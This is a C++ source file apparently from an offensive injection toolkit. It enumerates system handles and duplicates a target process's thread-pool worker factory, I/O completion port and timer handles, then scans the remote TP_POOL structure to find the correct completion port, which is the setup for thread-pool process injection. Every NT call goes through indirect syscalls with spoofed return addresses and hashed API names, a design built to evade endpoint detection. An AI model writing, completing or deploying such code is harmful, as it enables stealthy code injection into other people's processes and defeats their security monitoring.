// ============================================================================
// Handle Hijacking  Implementation
// ============================================================================
// Enumerates system handles, identifies thread pool objects in the target
// process, and duplicates them into our process for manipulation.
//
// CRITICAL FIX: The worker factory's CompletionPort field is often 0x0.
// Instead, we read the TP_POOL structure from the target and scan it for
// a HANDLE value matching one of the IoCompletion handles we found.
// This finds the CORRECT I/O completion port for the thread pool.
//
// All NT calls go through indirect syscalls (Tartarus + SyscallManager).
// No IAT entries for any NT API used here.
// ============================================================================

#include "handle_hijack.h"
#include "tartarus.h"
#include "syscall_manager.h"
#include "call_context.h"
#include "peb_lookup.h"
#include "hashing.h"
#include "config.h"
#include "prng.h"

namespace HandleHijack {

    // ========================================================================
    // Helpers
    // ========================================================================

    static inline void SpoofBegin() {
        CallContext::g_spoof_ret   = CallContext::GetLegitimateReturnAddress();
        CallContext::g_proxy_frame = nullptr;
    }

    static inline void SpoofEnd() {
        CallContext::g_spoof_ret   = nullptr;
        CallContext::g_proxy_frame = nullptr;
    }

    static NTSTATUS SyscallInvoke(uint32_t apiHash, ULONG_PTR a1 = 0, ULONG_PTR a2 = 0,
                                   ULONG_PTR a3 = 0, ULONG_PTR a4 = 0, ULONG_PTR a5 = 0,
                                   ULONG_PTR a6 = 0, ULONG_PTR a7 = 0, ULONG_PTR a8 = 0,
                                   ULONG_PTR a9 = 0, ULONG_PTR a10 = 0, ULONG_PTR a11 = 0) {
        const Tartarus::SyscallEntry* entry = Tartarus::GetSyscall(apiHash);
        if (!entry) return (NTSTATUS)0xC0000001L;

        SpoofBegin();
        NTSTATUS status = DoSyscallSpoofed(
            entry->Ssn, SyscallManager::GetRandomTrampoline(),
            a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
        SpoofEnd();
        return status;
    }

    // ========================================================================
    // Wide string comparison (no CRT)
    // ========================================================================

    static bool WideEquals(const WCHAR* a, const WCHAR* b, USHORT lenBytes) {
        USHORT lenChars = lenBytes / sizeof(WCHAR);
        for (USHORT i = 0; i < lenChars; i++) {
            if (a[i] != b[i]) return false;
        }
        return true;
    }

    // ========================================================================
    // Object type identification
    // ========================================================================

    static const WCHAR TYPE_WORKER_FACTORY[] = L"TpWorkerFactory";
    static const WCHAR TYPE_IO_COMPLETION[]  = L"IoCompletion";
    static const WCHAR TYPE_IRTIMER[]        = L"IRTimer";

    enum HandleType {
        HANDLE_UNKNOWN = 0,
        HANDLE_WORKER_FACTORY,
        HANDLE_IO_COMPLETION,
        HANDLE_IRTIMER,
    };

    static HandleType IdentifyHandle(HANDLE duplicatedHandle) {
        BYTE typeInfoBuf[512];
        ULONG returnLength = 0;

        NTSTATUS status = SyscallInvoke(
            HASH_API("NtQueryObject"),
            (ULONG_PTR)duplicatedHandle,
            (ULONG_PTR)ObjectTypeInformation,
            (ULONG_PTR)typeInfoBuf,
            (ULONG_PTR)sizeof(typeInfoBuf),
            (ULONG_PTR)&returnLength
        );

        if (!NT_SUCCESS(status)) return HANDLE_UNKNOWN;

        POBJECT_TYPE_INFORMATION typeInfo = (POBJECT_TYPE_INFORMATION)typeInfoBuf;
        USHORT nameLen = typeInfo->TypeName.Length;
        WCHAR* name = typeInfo->TypeName.Buffer;

        if (!name || nameLen == 0) return HANDLE_UNKNOWN;

        if (nameLen == sizeof(TYPE_WORKER_FACTORY) - sizeof(WCHAR) &&
            WideEquals(name, TYPE_WORKER_FACTORY, nameLen)) {
            return HANDLE_WORKER_FACTORY;
        }

        if (nameLen == sizeof(TYPE_IO_COMPLETION) - sizeof(WCHAR) &&
            WideEquals(name, TYPE_IO_COMPLETION, nameLen)) {
            return HANDLE_IO_COMPLETION;
        }

        if (nameLen == sizeof(TYPE_IRTIMER) - sizeof(WCHAR) &&
            WideEquals(name, TYPE_IRTIMER, nameLen)) {
            return HANDLE_IRTIMER;
        }

        return HANDLE_UNKNOWN;
    }

    // ========================================================================
    // Worker factory query
    // ========================================================================

    static bool QueryWorkerFactory(HANDLE wfHandle, HijackedHandles& out) {
        WORKER_FACTORY_BASIC_INFORMATION wfInfo = {};
        ULONG returnLength = 0;

        NTSTATUS status = SyscallInvoke(
            HASH_API("NtQueryInformationWorkerFactory"),
            (ULONG_PTR)wfHandle,
            (ULONG_PTR)WorkerFactoryBasicInformation,
            (ULONG_PTR)&wfInfo,
            (ULONG_PTR)sizeof(wfInfo),
            (ULONG_PTR)&returnLength
        );

        if (!NT_SUCCESS(status)) {
            LOG_ERROR("HandleHijack: NtQueryInformationWorkerFactory failed: 0x%08X", status);
            return false;
        }

        out.TpPoolAddress       = wfInfo.StartParameter;
        out.StartRoutine        = wfInfo.StartRoutine;
        out.TotalWorkerCount    = wfInfo.TotalWorkerCount;
        out.MinimumWorkerCount  = wfInfo.MinimumWorkerCount;
        out.WfCompletionPortHandle = (ULONG_PTR)wfInfo.CompletionPort;

        LOG_SUCCESS("HandleHijack: TP_POOL @ %p, StartRoutine @ %p, Workers: %u (min: %u)",
            out.TpPoolAddress, out.StartRoutine,
            out.TotalWorkerCount, out.MinimumWorkerCount);
        LOG("HandleHijack: WorkerFactory CompletionPort handle in target: 0x%llX",
            (unsigned long long)(ULONG_PTR)wfInfo.CompletionPort);

        // Dump raw WORKER_FACTORY_BASIC_INFORMATION as QWORDs
        {
            const unsigned long long* qw = (const unsigned long long*)&wfInfo;
            int nqw = (int)(sizeof(wfInfo) / 8);
            if (nqw > 16) nqw = 16;
            LOG("HandleHijack: WF raw dump (%u bytes, %d qwords):", (unsigned)sizeof(wfInfo), nqw);
            for (int qi = 0; qi < nqw; qi++) {
                LOG("  WF[0x%02X] = 0x%016llX", qi * 8, qw[qi]);
            }
        }

        return true;
    }
    // ========================================================================
    // TP_POOL scan — find the correct IoCompletion handle for the thread pool
    // ========================================================================
    // The worker factory's CompletionPort field is often 0x0 on modern Windows.
    // The actual IoCompletion handle is stored inside the TP_POOL structure.
    // We read the TP_POOL from the target, then scan every QWORD for a value
    // that matches one of the IoCompletion handle values we enumerated.
    //
    // This is the fix for Bug 6: wrong I/O completion port.

    static bool MatchIoCompletionFromTpPool(HANDLE targetProcess, HijackedHandles& handles) {
        if (!handles.TpPoolAddress) {
            LOG_ERROR("HandleHijack: No TP_POOL address for IoCompletion matching");
            return false;
        }
        if (handles.IoCompletionCandidateCount == 0) {
            LOG_ERROR("HandleHijack: No IoCompletion candidates to match");
            return false;
        }

        // Read the TP_POOL structure from the target (it's ~0x400 bytes)
        const SIZE_T POOL_READ_SIZE = 0x500;
        BYTE poolData[POOL_READ_SIZE] = {};

        if (!MemoryWriter::RemoteRead(targetProcess, handles.TpPoolAddress, poolData, POOL_READ_SIZE)) {
            LOG_ERROR("HandleHijack: Failed to read TP_POOL @ %p", handles.TpPoolAddress);
            return false;
        }

        LOG("HandleHijack: Read TP_POOL (%zu bytes) from %p", POOL_READ_SIZE, handles.TpPoolAddress);

        // Dump first 32 QWORDs of TP_POOL for diagnostics
        {
            const unsigned long long* qw = (const unsigned long long*)poolData;
            LOG("HandleHijack: TP_POOL raw dump (first 32 qwords):");
            for (int qi = 0; qi < 32; qi++) {
                LOG("  POOL[0x%03X] = 0x%016llX", qi * 8, qw[qi]);
            }
        }

        // Build a set of candidate handle values for fast lookup
        LOG("HandleHijack: Scanning TP_POOL for %d IoCompletion candidate handle values:",
            handles.IoCompletionCandidateCount);
        for (int c = 0; c < handles.IoCompletionCandidateCount; c++) {
            LOG("  Candidate %d: handle value 0x%llX in target",
                c, (unsigned long long)handles.IoCompletionCandidates[c].HandleValue);
        }

        // Scan every QWORD in the TP_POOL for a matching handle value.
        // Handle values are small integers (typically < 0x10000), multiples of 4.
        // We look for exact matches against our candidate list.
        int matchCount = 0;
        int bestCandidateIdx = -1;
        SIZE_T bestOffset = 0;

        for (SIZE_T off = 0; off < POOL_READ_SIZE - 7; off += 8) {
            ULONG_PTR val = *(ULONG_PTR*)(poolData + off);

            // Skip obviously non-handle values
            if (val == 0) continue;
            if (val > 0xFFFF) continue;  // Handles are small integers
            if (val & 3) continue;       // Handles are 4-byte aligned

            for (int c = 0; c < handles.IoCompletionCandidateCount; c++) {
                if (val == handles.IoCompletionCandidates[c].HandleValue) {
                    LOG_SUCCESS("HandleHijack: TP_POOL[0x%03zX] = 0x%llX matches IoCompletion candidate %d",
                        off, (unsigned long long)val, c);
                    matchCount++;
                    if (bestCandidateIdx < 0) {
                        bestCandidateIdx = c;
                        bestOffset = off;
                    }
                }
            }
        }

        if (bestCandidateIdx < 0) {
            LOG_ERROR("HandleHijack: No IoCompletion handle found in TP_POOL!");
            LOG_ERROR("HandleHijack: The thread pool may use a different mechanism");
            return false;
        }

        if (matchCount > 1) {
            LOG("HandleHijack: Found %d matches in TP_POOL, using first at offset 0x%03zX", matchCount, bestOffset);
        }

        // Set the matched IoCompletion as the one to use
        HANDLE oldIoCompletion = handles.IoCompletion;
        ULONG_PTR oldHandleValue = handles.IoCompletionHandleValue;

        handles.IoCompletion = handles.IoCompletionCandidates[bestCandidateIdx].Duplicated;
        handles.IoCompletionHandleValue = handles.IoCompletionCandidates[bestCandidateIdx].HandleValue;

        LOG_SUCCESS("HandleHijack: Using IoCompletion 0x%llX (from TP_POOL offset 0x%03zX)",
            (unsigned long long)handles.IoCompletionHandleValue, bestOffset);

        if (oldHandleValue != handles.IoCompletionHandleValue) {
            LOG("HandleHijack: CHANGED from 0x%llX to 0x%llX",
                (unsigned long long)oldHandleValue,
                (unsigned long long)handles.IoCompletionHandleValue);
        }

        // Close all OTHER candidates we're not using
        for (int c = 0; c < handles.IoCompletionCandidateCount; c++) {
            if (c != bestCandidateIdx && handles.IoCompletionCandidates[c].Duplicated) {
                SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)handles.IoCompletionCandidates[c].Duplicated);
                handles.IoCompletionCandidates[c].Duplicated = nullptr;
            }
        }

        return true;
    }
    // ========================================================================
    // Main hijacking routine
    // ========================================================================

    HijackResult Hijack(HANDLE targetProcess, DWORD targetPid) {
        HijackResult result = {};
        result.Handles.IoCompletionCandidateCount = 0;

        // Allocate buffer for system handle enumeration
        ULONG bufSize = 4 * 1024 * 1024;
        PVOID buf = nullptr;
        SIZE_T allocSize = bufSize;

        NTSTATUS status = SyscallInvoke(
            HASH_API("NtAllocateVirtualMemory"),
            (ULONG_PTR)(HANDLE)-1,
            (ULONG_PTR)&buf,
            (ULONG_PTR)0,
            (ULONG_PTR)&allocSize,
            (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE),
            (ULONG_PTR)PAGE_READWRITE
        );

        if (!NT_SUCCESS(status) || !buf) {
            LOG_ERROR("HandleHijack: Failed to allocate handle enum buffer");
            return result;
        }

        // Query all system handles
        ULONG returnLength = 0;
        status = SyscallInvoke(
            HASH_API("NtQuerySystemInformation"),
            (ULONG_PTR)SystemHandleInformationEx,
            (ULONG_PTR)buf,
            (ULONG_PTR)bufSize,
            (ULONG_PTR)&returnLength
        );

        // Retry with larger buffer if needed
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            SIZE_T freeSize = 0;
            SyscallInvoke(HASH_API("NtFreeVirtualMemory"),
                (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&buf, (ULONG_PTR)&freeSize, (ULONG_PTR)MEM_RELEASE);

            bufSize = returnLength + 0x10000;
            allocSize = bufSize;
            buf = nullptr;

            status = SyscallInvoke(
                HASH_API("NtAllocateVirtualMemory"),
                (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&buf, (ULONG_PTR)0,
                (ULONG_PTR)&allocSize, (ULONG_PTR)(MEM_COMMIT | MEM_RESERVE),
                (ULONG_PTR)PAGE_READWRITE
            );

            if (!NT_SUCCESS(status) || !buf) {
                LOG_ERROR("HandleHijack: Failed to allocate larger buffer");
                return result;
            }

            status = SyscallInvoke(
                HASH_API("NtQuerySystemInformation"),
                (ULONG_PTR)SystemHandleInformationEx,
                (ULONG_PTR)buf, (ULONG_PTR)bufSize, (ULONG_PTR)&returnLength
            );
        }

        if (!NT_SUCCESS(status)) {
            LOG_ERROR("HandleHijack: NtQuerySystemInformation failed: 0x%08X", status);
            SIZE_T freeSize = 0;
            SyscallInvoke(HASH_API("NtFreeVirtualMemory"),
                (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&buf, (ULONG_PTR)&freeSize, (ULONG_PTR)MEM_RELEASE);
            return result;
        }

        PSYSTEM_HANDLE_INFORMATION_EX handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)buf;
        result.HandleCount = (int)handleInfo->NumberOfHandles;

        LOG("HandleHijack: Enumerating %llu system handles for PID %u",
            handleInfo->NumberOfHandles, targetPid);

        // Phase 1: Collect ALL handles of interest from the target process.
        // We store ALL IoCompletion handles as candidates  we'll pick the
        // correct one later by matching against the TP_POOL contents.
        for (ULONG_PTR i = 0; i < handleInfo->NumberOfHandles; i++) {
            PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX entry = &handleInfo->Handles[i];

            if (entry->UniqueProcessId != (ULONG_PTR)targetPid) continue;

            HANDLE duplicated = nullptr;
            status = SyscallInvoke(
                HASH_API("NtDuplicateObject"),
                (ULONG_PTR)targetProcess,
                (ULONG_PTR)entry->HandleValue,
                (ULONG_PTR)(HANDLE)-1,
                (ULONG_PTR)&duplicated,
                (ULONG_PTR)0,
                (ULONG_PTR)0,
                (ULONG_PTR)DUPLICATE_SAME_ACCESS
            );

            if (!NT_SUCCESS(status) || !duplicated) continue;

            HandleType type = IdentifyHandle(duplicated);

            switch (type) {
                case HANDLE_WORKER_FACTORY:
                    if (!result.Handles.WorkerFactory) {
                        result.Handles.WorkerFactory = duplicated;
                        result.WorkerFactories++;
                        QueryWorkerFactory(duplicated, result.Handles);
                        LOG_SUCCESS("HandleHijack: Worker factory handle: 0x%llX -> local %p",
                            entry->HandleValue, duplicated);
                    } else {
                        SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)duplicated);
                        result.WorkerFactories++;
                    }
                    break;

                case HANDLE_IO_COMPLETION:
                    // Store ALL IoCompletion handles as candidates
                    if (result.Handles.IoCompletionCandidateCount < MAX_IO_COMPLETIONS) {
                        int idx = result.Handles.IoCompletionCandidateCount++;
                        result.Handles.IoCompletionCandidates[idx].Duplicated = duplicated;
                        result.Handles.IoCompletionCandidates[idx].HandleValue = (ULONG_PTR)entry->HandleValue;
                        result.IoCompletions++;
                        LOG("HandleHijack: IoCompletion candidate %d: handle 0x%llX -> local %p",
                            idx, entry->HandleValue, duplicated);
                    } else {
                        SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)duplicated);
                        result.IoCompletions++;
                    }
                    break;

                case HANDLE_IRTIMER:
                    if (!result.Handles.Timer) {
                        result.Handles.Timer = duplicated;
                        result.Timers++;
                        LOG_SUCCESS("HandleHijack: IRTimer handle: 0x%llX -> local %p",
                            entry->HandleValue, duplicated);
                    } else {
                        SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)duplicated);
                        result.Timers++;
                    }
                    break;

                default:
                    SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)duplicated);
                    break;
            }
        }

        // Free enumeration buffer
        SIZE_T freeSize = 0;
        SyscallInvoke(HASH_API("NtFreeVirtualMemory"),
            (ULONG_PTR)(HANDLE)-1, (ULONG_PTR)&buf, (ULONG_PTR)&freeSize, (ULONG_PTR)MEM_RELEASE);

        LOG("HandleHijack: Found %d worker factories, %d I/O completions, %d timers",
            result.WorkerFactories, result.IoCompletions, result.Timers);

        // Phase 2: Match the correct IoCompletion by scanning TP_POOL.
        // This is the critical fix for Bug 6.
        if (result.Handles.TpPoolAddress && result.Handles.IoCompletionCandidateCount > 0) {
            bool matched = MatchIoCompletionFromTpPool(targetProcess, result.Handles);
            if (matched) {
                LOG_SUCCESS("HandleHijack: IoCompletion matched from TP_POOL scan");
            } else {
                // Fallback: use the first candidate (old behavior, may crash target)
                LOG_ERROR("HandleHijack: TP_POOL scan failed, falling back to first IoCompletion");
                result.Handles.IoCompletion = result.Handles.IoCompletionCandidates[0].Duplicated;
                result.Handles.IoCompletionHandleValue = result.Handles.IoCompletionCandidates[0].HandleValue;
                // Close all other candidates
                for (int c = 1; c < result.Handles.IoCompletionCandidateCount; c++) {
                    if (result.Handles.IoCompletionCandidates[c].Duplicated) {
                        SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)result.Handles.IoCompletionCandidates[c].Duplicated);
                        result.Handles.IoCompletionCandidates[c].Duplicated = nullptr;
                    }
                }
            }
        } else if (result.Handles.IoCompletionCandidateCount > 0) {
            // No TP_POOL address  just use first candidate
            result.Handles.IoCompletion = result.Handles.IoCompletionCandidates[0].Duplicated;
            result.Handles.IoCompletionHandleValue = result.Handles.IoCompletionCandidates[0].HandleValue;
            for (int c = 1; c < result.Handles.IoCompletionCandidateCount; c++) {
                if (result.Handles.IoCompletionCandidates[c].Duplicated) {
                    SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)result.Handles.IoCompletionCandidates[c].Duplicated);
                    result.Handles.IoCompletionCandidates[c].Duplicated = nullptr;
                }
            }
        }

        result.Success = (result.Handles.WorkerFactory != nullptr || result.Handles.IoCompletion != nullptr);

        return result;
    }

    // ========================================================================
    // Release
    // ========================================================================

    void Release(HijackedHandles& handles) {
        if (handles.WorkerFactory) {
            SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)handles.WorkerFactory);
            handles.WorkerFactory = nullptr;
        }
        if (handles.IoCompletion) {
            SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)handles.IoCompletion);
            handles.IoCompletion = nullptr;
        }
        if (handles.Timer) {
            SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)handles.Timer);
            handles.Timer = nullptr;
        }
        // Close any remaining candidates that weren't cleaned up
        for (int c = 0; c < handles.IoCompletionCandidateCount; c++) {
            if (handles.IoCompletionCandidates[c].Duplicated &&
                handles.IoCompletionCandidates[c].Duplicated != handles.IoCompletion) {
                SyscallInvoke(HASH_API("NtClose"), (ULONG_PTR)handles.IoCompletionCandidates[c].Duplicated);
                handles.IoCompletionCandidates[c].Duplicated = nullptr;
            }
        }
        LOG("HandleHijack: All handles released");
    }

} // namespace HandleHijack